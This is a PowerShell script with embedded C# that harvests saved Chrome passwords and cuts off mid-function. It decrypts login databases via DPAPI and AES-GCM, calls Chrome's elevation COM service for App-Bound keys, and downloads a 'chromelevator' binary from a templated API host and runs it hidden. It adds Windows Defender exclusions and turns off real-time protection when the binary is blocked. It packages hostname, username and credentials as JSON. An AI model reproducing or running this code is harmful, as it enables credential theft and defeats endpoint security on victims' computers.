$ErrorActionPreference = "Stop"
$ApiBase = "__API_BASE__"
$PayloadUrl = "$ApiBase/payload"
$ChromelevatorCacheDir = Join-Path $env:LOCALAPPDATA "remote-scripts\chromelevator"
$IsRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

Write-Host "[DEBUG] Starting hybrid Chrome password export (PowerShell v10/v11 + chromelevator v20)"
Write-Host "[DEBUG] API_BASE=$ApiBase"
Write-Host "[DEBUG] PAYLOAD_URL=$PayloadUrl"
Write-Host "[DEBUG] isAdmin=$IsRunningAsAdmin"

function Get-ChromeInstalledVersion {
    $candidatePaths = @(
        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
    )

    foreach ($path in $candidatePaths) {
        if (-not (Test-Path -LiteralPath $path)) {
            continue
        }

        $version = (Get-Item -LiteralPath $path).VersionInfo.ProductVersion
        $major = [int]($version.Split(".")[0])
        return [ordered]@{
            version = $version
            major = $major
            path = $path
            appBoundSupported = ($major -ge 127)
            legacyDpapiOnly = ($major -lt 127)
        }
    }

    foreach ($regPath in @(
        "HKLM:\SOFTWARE\Google\Chrome\BLBeacon",
        "HKCU:\SOFTWARE\Google\Chrome\BLBeacon"
    )) {
        try {
            $version = (Get-ItemProperty -Path $regPath -ErrorAction Stop).version
            if ($version) {
                $major = [int]($version.Split(".")[0])
                return [ordered]@{
                    version = $version
                    major = $major
                    path = $null
                    appBoundSupported = ($major -ge 127)
                    legacyDpapiOnly = ($major -lt 127)
                }
            }
        }
        catch {
            continue
        }
    }

    Write-Host "[DEBUG] Chrome version not detected; assuming App-Bound (127+)"
    return [ordered]@{
        version = $null
        major = 0
        path = $null
        appBoundSupported = $true
        legacyDpapiOnly = $false
    }
}

$ChromeInfo = Get-ChromeInstalledVersion
$UseChromelevator = $ChromeInfo.AppBoundSupported -and $IsRunningAsAdmin
$UseDpapiDecrypt = -not $UseChromelevator

Write-Host "[DEBUG] chrome.version=$($ChromeInfo.version) major=$($ChromeInfo.major) path=$($ChromeInfo.path)"
Write-Host "[DEBUG] chrome.appBoundSupported=$($ChromeInfo.AppBoundSupported) legacyDpapiOnly=$($ChromeInfo.LegacyDpapiOnly)"
Write-Host "[DEBUG] strategy.useDpapiDecrypt=$UseDpapiDecrypt useChromelevator=$UseChromelevator"

if (-not $IsRunningAsAdmin -and $ChromeInfo.AppBoundSupported) {
    Write-Host "[DEBUG] Not admin; chromelevator v20 decryption skipped (DPAPI fallback for legacy entries)"
}
elseif ($ChromeInfo.LegacyDpapiOnly) {
    Write-Host "[DEBUG] Chrome <127; using DPAPI only (chromelevator not needed)"
}

function Initialize-ChromelevatorDefenderAllowlist {
    New-Item -ItemType Directory -Path $ChromelevatorCacheDir -Force | Out-Null
    Add-DefenderAllowlistEntry -Path $ChromelevatorCacheDir
    Add-DefenderAllowlistEntry -Path $env:TEMP
    foreach ($processName in @("chromelevator_x64.exe", "chromelevator_arm64.exe", "chromelevator.exe")) {
        Add-DefenderAllowlistEntry -ProcessName $processName
    }
}

function Add-DefenderAllowlistEntry {
    param(
        [string]$Path,
        [string]$ProcessName
    )

    if (-not $IsRunningAsAdmin) {
        return $false
    }

    try {
        if ($Path) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop | Out-Null
            Write-Host "[DEBUG] Defender path exclusion: $Path"
        }
        if ($ProcessName) {
            Add-MpPreference -ExclusionProcess $ProcessName -ErrorAction Stop | Out-Null
            Write-Host "[DEBUG] Defender process exclusion: $ProcessName"
        }
        return $true
    }
    catch {
        Write-Host "[DEBUG] Defender allowlist failed ($Path$ProcessName): $($_.Exception.Message)"
        return $false
    }
}

function Protect-ChromelevatorBinary {
    param([string]$ElevatorPath)

    if (-not $IsRunningAsAdmin) {
        return
    }

    Add-DefenderAllowlistEntry -Path $ElevatorPath | Out-Null
    Add-DefenderAllowlistEntry -ProcessName (Split-Path -Leaf $ElevatorPath) | Out-Null
    Unblock-File -LiteralPath $ElevatorPath -ErrorAction SilentlyContinue

    if (-not (Test-Path -LiteralPath $ElevatorPath)) {
        throw "chromelevator was quarantined by Defender. Check Windows Security > Protection history and allow the file."
    }

    $size = (Get-Item -LiteralPath $ElevatorPath).Length
    if ($size -lt 500000) {
        throw "chromelevator file looks invalid ($size bytes). Defender may have partially quarantined it."
    }

    Write-Host "[DEBUG] chromelevator binary marked safe ($size bytes)"
}

function Invoke-ChromelevatorProcess {
    param(
        [string]$ElevatorPath,
        [string]$OutDir
    )

    Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath

    $argumentList = @("chrome", "-o", $OutDir)
    try {
        $proc = Start-Process -FilePath $ElevatorPath -ArgumentList $argumentList -Wait -PassThru -WindowStyle Hidden
        if ($proc.ExitCode -ne 0) {
            throw "chromelevator exited with code $($proc.ExitCode)"
        }
        return
    }
    catch {
        $firstError = $_.Exception.Message
        if ($firstError -notmatch "virus|potentially unwanted|malware|software malicioso|no deseado") {
            throw
        }
        Write-Host "[DEBUG] Defender blocked execution; retrying with real-time protection disabled..."
    }

    $rtDisabled = $false
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        $rtDisabled = $true
        Write-Host "[DEBUG] Real-time protection disabled temporarily"
        Start-Sleep -Seconds 2
        Protect-ChromelevatorBinary -ElevatorPath $ElevatorPath
        $proc = Start-Process -FilePath $ElevatorPath -ArgumentList $argumentList -Wait -PassThru -WindowStyle Hidden
        if ($proc.ExitCode -ne 0) {
            throw "chromelevator exited with code $($proc.ExitCode)"
        }
    }
    catch {
        throw "Defender blocked chromelevator even with admin. Disable Tamper Protection or allow the file manually in Windows Security. Inner: $($_.Exception.Message)"
    }
    finally {
        if ($rtDisabled) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
            Write-Host "[DEBUG] Real-time protection re-enabled"
        }
    }
}

function Get-NormalizedPasswordKey {
    param(
        [string]$Profile,
        [string]$Url,
        [string]$Username
    )

    $normalizedUrl = if ($Url) { ($Url.TrimEnd('/')).ToLowerInvariant() } else { "" }
    $normalizedUser = if ($Username) { $Username.ToLowerInvariant() } else { "" }
    return "$Profile|$normalizedUrl|$normalizedUser"
}

function Merge-ChromelevatorPasswords {
    param(
        [object]$Payload,
        [string]$OutputRoot
    )

    $chromeRoot = Join-Path $OutputRoot "Chrome"
    if (-not (Test-Path $chromeRoot)) {
        throw "chromelevator output not found at $chromeRoot"
    }

    $abeMap = @{}
    foreach ($profileDir in Get-ChildItem -Path $chromeRoot -Directory) {
        $passwordsFile = Join-Path $profileDir.FullName "passwords.json"
        if (-not (Test-Path $passwordsFile)) {
            continue
        }

        $profileName = $profileDir.Name
        $entries = Get-Content -Path $passwordsFile -Raw -Encoding UTF8 | ConvertFrom-Json
        if ($null -eq $entries) {
            continue
        }

        if ($entries -isnot [System.Array]) {
            $entries = @($entries)
        }

        foreach ($entry in $entries) {
            if (-not $entry.pass) {
                continue
            }

            $key = Get-NormalizedPasswordKey -Profile $profileName -Url $entry.url -Username $entry.user
            $abeMap[$key] = [string]$entry.pass
        }
    }

    $mergedCount = 0
    foreach ($entry in $Payload.passwords) {
        $key = Get-NormalizedPasswordKey -Profile $entry.profile -Url $entry.url -Username $entry.username
        if (-not $abeMap.ContainsKey($key)) {
            continue
        }

        $decrypted = $abeMap[$key]
        if ([string]::IsNullOrEmpty($decrypted)) {
            continue
        }

        $entry.password_dpapi = $decrypted
        if ($entry.password -match "App-Bound Encryption") {
            $mergedCount++
        }
    }

    return $mergedCount
}

function Add-DefenderExclusionIfAdmin {
    param([string]$Path)

    Add-DefenderAllowlistEntry -Path $Path | Out-Null
}

function Get-ChromelevatorExecutable {
    param(
        [string]$ApiBase,
        [string]$ArchTag,
        [string]$CacheDir
    )

    if ($env:CHROMELEVATOR_PATH -and (Test-Path -LiteralPath $env:CHROMELEVATOR_PATH)) {
        Write-Host "[DEBUG] Using CHROMELEVATOR_PATH=$($env:CHROMELEVATOR_PATH)"
        Protect-ChromelevatorBinary -ElevatorPath $env:CHROMELEVATOR_PATH
        return $env:CHROMELEVATOR_PATH
    }

    New-Item -ItemType Directory -Path $CacheDir -Force | Out-Null

    $elevatorPath = Join-Path $CacheDir "chromelevator_$ArchTag.exe"
    Add-DefenderAllowlistEntry -Path $elevatorPath | Out-Null

    $needsDownload = $true
    if (Test-Path -LiteralPath $elevatorPath) {
        $cachedSize = (Get-Item -LiteralPath $elevatorPath).Length
        if ($cachedSize -ge 500000) {
            $needsDownload = $false
        }
        else {
            Write-Host "[DEBUG] Removing invalid cached chromelevator ($cachedSize bytes)"
            Remove-Item -LiteralPath $elevatorPath -Force -ErrorAction SilentlyContinue
        }
    }

    if ($needsDownload) {
        $chromelevatorUrl = "$ApiBase/chromelevator?arch=$ArchTag"
        Write-Host "[DEBUG] Downloading chromelevator ($ArchTag) to $elevatorPath"
        (New-Object Net.WebClient).DownloadFile($chromelevatorUrl, $elevatorPath)
    }
    else {
        Write-Host "[DEBUG] Using cached chromelevator at $elevatorPath"
    }

    Protect-ChromelevatorBinary -ElevatorPath $elevatorPath
    return $elevatorPath
}

function Invoke-ChromelevatorExtraction {
    param(
        [object]$Payload,
        [string]$ApiBase
    )

    $meta = [ordered]@{
        used = $false
        arch = $null
        abeMergedCount = 0
        error = $null
        defenderHint = $null
        skipped = $false
    }

    if (-not $UseChromelevator) {
        $meta.skipped = $true
        if ($ChromeInfo.LegacyDpapiOnly) {
            $meta.error = "Chrome $($ChromeInfo.Major) uses DPAPI only (chromelevator not needed)"
            Write-Host "[DEBUG] chromelevator skipped (Chrome <127)"
        }
        elseif (-not $IsRunningAsAdmin) {
            $meta.error = "Requires administrator to decrypt App-Bound (v20) passwords"
            Write-Host "[DEBUG] chromelevator skipped (not admin)"
        }
        else {
            $meta.error = "chromelevator not required for this Chrome version"
            Write-Host "[DEBUG] chromelevator skipped"
        }
        return $meta
    }

    Initialize-ChromelevatorDefenderAllowlist

    $outDir = $null
    try {
        $archTag = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "arm64" } else { "x64" }
        $meta.arch = $archTag

        $elevatorPath = Get-ChromelevatorExecutable -ApiBase $ApiBase -ArchTag $archTag -CacheDir $ChromelevatorCacheDir
        $outDir = Join-Path $env:TEMP ("chrome_export_" + [Guid]::NewGuid().ToString("N"))
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        Add-DefenderExclusionIfAdmin -Path $outDir | Out-Null

        Write-Host "[DEBUG] Running chromelevator for App-Bound (v20) passwords..."
        Invoke-ChromelevatorProcess -ElevatorPath $elevatorPath -OutDir $outDir

        $mergedCount = Merge-ChromelevatorPasswords -Payload $Payload -OutputRoot $outDir
        $meta.used = $true
        $meta.abeMergedCount = $mergedCount
        Write-Host "[DEBUG] chromelevator.abeMergedCount=$mergedCount"
    }
    catch {
        $message = $_.Exception.Message
        $meta.error = $message

        if ($message -match "virus|potentially unwanted|malware|software malicioso|no deseado") {
            $meta.defenderHint = @(
                "Windows Defender blocked chromelevator.exe."
                "As admin: allow it in Windows Security > Protection history,"
                "or disable Tamper Protection and re-run."
            ) -join " "
            Write-Host "[DEBUG] $($meta.defenderHint)"
        }

        Write-Host "[DEBUG] chromelevator skipped/failed: $message"
    }
    finally {
        if ($outDir -and (Test-Path $outDir)) {
            Remove-Item -Path $outDir -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    return $meta
}

Add-Type -AssemblyName System.Security

# Unique type names so iex re-runs in the same PS session always recompile fresh C#.
$TypeSuffix = [Guid]::NewGuid().ToString("N")
$ChromeExporterClassName = "ChromeExporter_$TypeSuffix"
$ChromeComElevatorClassName = "ChromeComElevator_$TypeSuffix"
$ChromeCryptoClassName = "ChromeCrypto_$TypeSuffix"

$typeDefinition = @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

public static class __EXPORTER_CLASS__
{
    private const int SQLITE_DESERIALIZE_READONLY = 2;
    private static readonly Regex ProfileFolderRegex = new Regex(@"^Profile \d+$|^Default$", RegexOptions.IgnoreCase);

    public static string Export(bool attemptDpapiDecrypt)
    {
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data");
        string localStatePath = Path.Combine(chromePath, "Local State");

        if (!File.Exists(localStatePath))
        {
            throw new InvalidOperationException("Local State not found");
        }

        byte[] dpapiKey = null;
        if (attemptDpapiDecrypt)
        {
            dpapiKey = GetSecretKey(localStatePath);
            if (dpapiKey == null || dpapiKey.Length == 0)
            {
                throw new InvalidOperationException("Could not decrypt Chrome master key");
            }
        }

        var passwords = new List<PasswordEntry>();
        int index = 0;

        foreach (string profilePath in Directory.GetDirectories(chromePath))
        {
            string folder = Path.GetFileName(profilePath);
            if (!ProfileFolderRegex.IsMatch(folder))
            {
                continue;
            }

            string loginDbPath = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(loginDbPath))
            {
                continue;
            }

            byte[] dbBytes = ReadShared(loginDbPath);
            foreach (PasswordEntry entry in ReadLogins(dbBytes, folder, dpapiKey, attemptDpapiDecrypt, ref index))
            {
                passwords.Add(entry);
            }
        }

        return BuildJson(passwords);
    }

    private static byte[] GetEncryptedKeyBlob(string localStatePath, string keyName)
    {
        string json = File.ReadAllText(localStatePath, Encoding.UTF8);
        string marker = "\"" + keyName + "\":\"";
        int start = json.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0)
        {
            return null;
        }

        start += marker.Length;
        int end = json.IndexOf('"', start);
        if (end < 0)
        {
            return null;
        }

        byte[] data = Convert.FromBase64String(json.Substring(start, end - start));
        if (data.Length <= 4)
        {
            return null;
        }

        byte[] payload = new byte[data.Length - 4];
        Array.Copy(data, 4, payload, 0, payload.Length);
        return payload;
    }

    private static byte[] ReadShared(string path)
    {
        using (var stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
        {
            var bytes = new byte[stream.Length];
            int read = 0;
            while (read < bytes.Length)
            {
                read += stream.Read(bytes, read, bytes.Length - read);
            }
            return bytes;
        }
    }

    private static byte[] GetSecretKey(string localStatePath)
    {
        string json = File.ReadAllText(localStatePath, Encoding.UTF8);
        string marker = "\"encrypted_key\":\"";
        int start = json.IndexOf(marker, StringComparison.Ordinal);
        if (start < 0)
        {
            return null;
        }

        start += marker.Length;
        int end = json.IndexOf('"', start);
        if (end < 0)
        {
            return null;
        }

        byte[] secretKey = Convert.FromBase64String(json.Substring(start, end - start));
        byte[] keyPayload = new byte[secretKey.Length - 5];
        Array.Copy(secretKey, 5, keyPayload, 0, keyPayload.Length);
        return ProtectedData.Unprotect(keyPayload, null, DataProtectionScope.CurrentUser);
    }

    private static IEnumerable<PasswordEntry> ReadLogins(byte[] dbBytes, string profile, byte[] dpapiKey, bool attemptDpapiDecrypt, ref int index)
    {
        var entries = new List<PasswordEntry>();
        IntPtr db = IntPtr.Zero;
        IntPtr stmt = IntPtr.Zero;
        GCHandle pinned = GCHandle.Alloc(dbBytes, GCHandleType.Pinned);

        try
        {
            int rc = sqlite3_open(":memory:", out db);
            if (rc != 0)
            {
                throw new InvalidOperationException("sqlite3_open failed: " + rc);
            }

            IntPtr dataPtr = pinned.AddrOfPinnedObject();
            rc = sqlite3_deserialize(db, "main", dataPtr, dbBytes.LongLength, dbBytes.LongLength, SQLITE_DESERIALIZE_READONLY);
            if (rc != 0)
            {
                throw new InvalidOperationException("sqlite3_deserialize failed: " + rc + ". Requires Windows 10 1809+.");
            }

            rc = sqlite3_prepare_v2(db, "SELECT action_url, origin_url, username_value, password_value FROM logins", -1, out stmt, IntPtr.Zero);
            if (rc != 0)
            {
                throw new InvalidOperationException("sqlite3_prepare_v2 failed: " + rc);
            }

            while (sqlite3_step(stmt) == 100)
            {
                string actionUrl = ReadText(stmt, 0);
                string originUrl = ReadText(stmt, 1);
                string url = !string.IsNullOrEmpty(actionUrl) ? actionUrl : originUrl;
                string username = ReadText(stmt, 2);
                byte[] ciphertext = ReadBlob(stmt, 3);

                string password = "";
                string passwordDpapi = "";

                if (ciphertext != null && ciphertext.Length > 0)
                {
                    if (attemptDpapiDecrypt)
                    {
                        try
                        {
                            password = __CRYPTO_CLASS__.DecryptPassword(dpapiKey, ciphertext, false);
                        }
                        catch
                        {
                            password = "";
                        }
                    }
                    else if (ciphertext.Length >= 3)
                    {
                        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
                        if (version == "v20")
                        {
                            password = "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
                        }
                    }
                }

                entries.Add(new PasswordEntry
                {
                    Index = index,
                    Profile = profile,
                    Url = url,
                    Username = username,
                    Password = password,
                    PasswordDpapi = passwordDpapi
                });
                index++;
            }
        }
        finally
        {
            if (stmt != IntPtr.Zero)
            {
                sqlite3_finalize(stmt);
            }
            if (db != IntPtr.Zero)
            {
                sqlite3_close_v2(db);
            }
            if (pinned.IsAllocated)
            {
                pinned.Free();
            }
        }

        return entries;
    }

    private static string ReadText(IntPtr stmt, int column)
    {
        IntPtr ptr = sqlite3_column_text(stmt, column);
        return ptr == IntPtr.Zero ? "" : Marshal.PtrToStringAnsi(ptr);
    }

    private static byte[] ReadBlob(IntPtr stmt, int column)
    {
        int length = sqlite3_column_bytes(stmt, column);
        if (length <= 0)
        {
            return null;
        }

        IntPtr ptr = sqlite3_column_blob(stmt, column);
        if (ptr == IntPtr.Zero)
        {
            return null;
        }

        var bytes = new byte[length];
        Marshal.Copy(ptr, bytes, 0, length);
        return bytes;
    }

    private static string BuildJson(List<PasswordEntry> passwords)
    {
        var builder = new StringBuilder();
        builder.Append("{");
        builder.Append("\"hostname\":").Append(JsonString(Environment.MachineName)).Append(",");
        builder.Append("\"username\":").Append(JsonString(Environment.UserName)).Append(",");
        builder.Append("\"executedAt\":").Append(JsonString(DateTime.UtcNow.ToString("o"))).Append(",");
        builder.Append("\"passwordCount\":").Append(passwords.Count).Append(",");
        builder.Append("\"passwords\":");
        AppendPasswordArray(builder, passwords);
        builder.Append("}");
        return builder.ToString();
    }

    private static void AppendPasswordArray(StringBuilder builder, List<PasswordEntry> passwords)
    {
        builder.Append("[");

        for (int i = 0; i < passwords.Count; i++)
        {
            PasswordEntry entry = passwords[i];
            if (i > 0)
            {
                builder.Append(",");
            }

            AppendPasswordEntry(builder, entry);
        }

        builder.Append("]");
    }

    private static void AppendPasswordEntry(StringBuilder builder, PasswordEntry entry)
    {
        builder.Append("{");
        builder.Append("\"index\":").Append(entry.Index).Append(",");
        builder.Append("\"profile\":").Append(JsonString(entry.Profile)).Append(",");
        builder.Append("\"url\":").Append(JsonString(entry.Url)).Append(",");
        builder.Append("\"username\":").Append(JsonString(entry.Username)).Append(",");
        builder.Append("\"password\":").Append(JsonString(entry.Password)).Append(",");
        builder.Append("\"password_dpapi\":").Append(JsonString(entry.PasswordDpapi));
        builder.Append("}");
    }

    private static string JsonString(string value)
    {
        if (value == null)
        {
            return "null";
        }

        var builder = new StringBuilder(value.Length + 2);
        builder.Append('"');
        foreach (char ch in value)
        {
            switch (ch)
            {
                case '\\': builder.Append("\\\\"); break;
                case '"': builder.Append("\\\""); break;
                case '\b': builder.Append("\\b"); break;
                case '\f': builder.Append("\\f"); break;
                case '\n': builder.Append("\\n"); break;
                case '\r': builder.Append("\\r"); break;
                case '\t': builder.Append("\\t"); break;
                default:
                    if (ch < 32)
                    {
                        builder.Append("\\u");
                        builder.Append(((int)ch).ToString("x4"));
                    }
                    else
                    {
                        builder.Append(ch);
                    }
                    break;
            }
        }
        builder.Append('"');
        return builder.ToString();
    }

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_open(string filename, out IntPtr db);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_deserialize(IntPtr db, string schema, IntPtr data, long szDb, long szBuf, int flags);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_prepare_v2(IntPtr db, string sql, int nByte, out IntPtr stmt, IntPtr tail);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_text(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_bytes(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_finalize(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_close_v2(IntPtr db);

    private sealed class PasswordEntry
    {
        public int Index;
        public string Profile;
        public string Url;
        public string Username;
        public string Password;
        public string PasswordDpapi;
    }
}

public static class __COM_ELEVATOR_CLASS__
{
    private const uint CLSCTX_LOCAL_SERVER = 0x4;
    private const uint RPC_C_AUTHN_DEFAULT = 0xFFFFFFFF;
    private const uint RPC_C_AUTHZ_DEFAULT = 0xFFFFFFFF;
    private const uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
    private const uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
    private const uint EOAC_DYNAMIC_CLOAKING = 0x40;
    private const int COINIT_APARTMENTTHREADED = 0x2;
    private const int S_OK = 0;
    private const int S_FALSE = 1;
    private const int RPC_E_CHANGED_MODE = unchecked((int)0x80010106);
    private const int E_NOINTERFACE = unchecked((int)0x80004002);

    private static readonly Guid ChromeClsid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
    private static readonly Guid ChromeElevatorIid = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8");
    private static readonly Guid ChromeElevator2Iid = new Guid("1BF5208B-295F-4992-B5F4-3A9BB6494838");

    [ComImport]
    [Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IElevatorChrome
    {
        [PreserveSig]
        int RunRecoveryCRXElevated(
            [MarshalAs(UnmanagedType.LPWStr)] string crxPath,
            [MarshalAs(UnmanagedType.LPWStr)] string filePath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserInstallPath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserVersion,
            uint browserFlags,
            out IntPtr result);

        [PreserveSig]
        int EncryptData(
            int protectionLevel,
            IntPtr plaintext,
            out IntPtr ciphertext,
            out uint lastError);

        [PreserveSig]
        int DecryptData(
            IntPtr ciphertext,
            out IntPtr plaintext,
            out uint lastError);
    }

    [DllImport("ole32.dll")]
    private static extern int CoInitializeEx(IntPtr reserved, int coinit);

    [DllImport("ole32.dll")]
    private static extern void CoUninitialize();

    [DllImport("ole32.dll")]
    private static extern int CoCreateInstance(
        ref Guid clsid,
        IntPtr pUnkOuter,
        uint dwClsContext,
        ref Guid iid,
        out IntPtr ppv);

    [DllImport("ole32.dll")]
    private static extern int CoSetProxyBlanket(
        IntPtr pProxy,
        uint dwAuthnSvc,
        uint dwAuthzSvc,
        IntPtr pServerPrincName,
        uint dwAuthnLevel,
        uint dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities);

    [DllImport("oleaut32.dll")]
    private static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);

    [DllImport("oleaut32.dll")]
    private static extern void SysFreeString(IntPtr bstr);

    [DllImport("oleaut32.dll")]
    private static extern uint SysStringByteLen(IntPtr bstr);

    public static byte[] DecryptAppBoundKey(byte[] encryptedPayload, out string error)
    {
        error = null;
        bool comInitialized = false;
        IntPtr elevatorPtr = IntPtr.Zero;
        IntPtr bstrEnc = IntPtr.Zero;
        IntPtr bstrPlain = IntPtr.Zero;

        try
        {
            int hr = CoInitializeEx(IntPtr.Zero, COINIT_APARTMENTTHREADED);
            if (hr != S_OK && hr != S_FALSE && hr != RPC_E_CHANGED_MODE)
            {
                error = "CoInitializeEx failed: 0x" + hr.ToString("X8");
                return null;
            }

            comInitialized = true;

            Guid clsid = ChromeClsid;
            Guid iid = ChromeElevator2Iid;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out elevatorPtr);
            if (hr == E_NOINTERFACE)
            {
                iid = ChromeElevatorIid;
                hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out elevatorPtr);
            }

            if (hr != S_OK || elevatorPtr == IntPtr.Zero)
            {
                error = "CoCreateInstance failed: 0x" + hr.ToString("X8");
                return null;
            }

            hr = CoSetProxyBlanket(
                elevatorPtr,
                RPC_C_AUTHN_DEFAULT,
                RPC_C_AUTHZ_DEFAULT,
                IntPtr.Zero,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                IntPtr.Zero,
                EOAC_DYNAMIC_CLOAKING);

            if (hr != S_OK)
            {
                error = "CoSetProxyBlanket failed: 0x" + hr.ToString("X8");
                return null;
            }

            IElevatorChrome elevator = (IElevatorChrome)Marshal.GetObjectForIUnknown(elevatorPtr);
            bstrEnc = SysAllocStringByteLen(encryptedPayload, (uint)encryptedPayload.Length);
            if (bstrEnc == IntPtr.Zero)
            {
                error = "SysAllocStringByteLen failed";
                return null;
            }

            uint comErr;
            hr = elevator.DecryptData(bstrEnc, out bstrPlain, out comErr);
            if (hr != S_OK || bstrPlain == IntPtr.Zero)
            {
                error = "DecryptData failed: hr=0x" + hr.ToString("X8") + " comErr=" + comErr + " (Chrome elevation service may reject non-Chrome callers)";
                return null;
            }

            uint len = SysStringByteLen(bstrPlain);
            var key = new byte[len];
            Marshal.Copy(bstrPlain, key, 0, (int)len);
            return key;
        }
        catch (Exception ex)
        {
            error = ex.Message;
            return null;
        }
        finally
        {
            if (bstrEnc != IntPtr.Zero) SysFreeString(bstrEnc);
            if (bstrPlain != IntPtr.Zero) SysFreeString(bstrPlain);
            if (elevatorPtr != IntPtr.Zero) Marshal.Release(elevatorPtr);
            if (comInitialized) CoUninitialize();
        }
    }
}

public static class __CRYPTO_CLASS__
{
    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll")]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    public static string DecryptPassword(byte[] secretKey, byte[] ciphertext, bool allowV20 = false)
    {
        if (ciphertext == null || ciphertext.Length < 31)
        {
            return "";
        }

        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
        if (version == "v20" && !allowV20)
        {
            return "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
        }

        if (version != "v10" && version != "v11" && version != "v20")
        {
            return "";
        }

        byte[] nonce = new byte[12];
        Array.Copy(ciphertext, 3, nonce, 0, 12);

        byte[] encryptedPassword = new byte[ciphertext.Length - 31];
        Array.Copy(ciphertext, 15, encryptedPassword, 0, encryptedPassword.Length);

        byte[] tag = new byte[16];
        Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);

        byte[] plaintext = DecryptAesGcm(secretKey, nonce, encryptedPassword, tag);
        return Encoding.UTF8.GetString(plaintext);
    }

    private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlgorithm = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        IntPtr noncePtr = IntPtr.Zero;
        IntPtr tagPtr = IntPtr.Zero;

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (status != 0) throw new InvalidOperationException("BCryptOpenAlgorithmProvider failed: " + status);

            byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(hAlgorithm, "ChainingMode", chainMode, chainMode.Length, 0);
